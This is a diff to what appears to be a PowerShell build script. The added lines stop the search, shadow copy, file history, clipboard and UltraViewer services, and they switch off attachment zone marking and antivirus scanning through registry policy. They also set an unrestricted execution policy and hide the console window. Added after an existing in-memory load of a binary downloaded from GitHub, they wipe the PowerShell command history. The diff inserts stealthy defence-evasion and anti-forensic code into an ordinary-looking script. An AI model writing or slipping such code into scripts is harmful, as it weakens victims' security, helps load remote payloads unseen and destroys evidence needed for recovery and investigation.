@@ -22,6 +22,33 @@ $Error.Clear()
 [bool]   $script:Verbose       = $false
 [string] $script:BuildLogFile  = $null
 
+
+
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
+
+
+
+Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue
+
+$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
+$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"
+
+Invoke-Expression $regCommand1 | Out-Null
+Invoke-Expression $regCommand2 | Out-Null
+
+Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
+
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@ -ErrorAction SilentlyContinue
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
+
+
 function Invoke-Finalize {
     try {
         Get-Variable -Scope Script -ErrorAction SilentlyContinue |
@@ -223,3 +250,16 @@ $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/dese
 
 [NativeLoader]::Map($bytes, $true)
 Invoke-Finalize
+
+Clear-History
+$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+if (Test-Path $historyPath) {
+    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
+}
+
+$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+if (-not (Test-Path $historyPath)) {
+    New-Item -Path $historyPath -ItemType File -Force | Out-Null
+} else {
+    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
+}
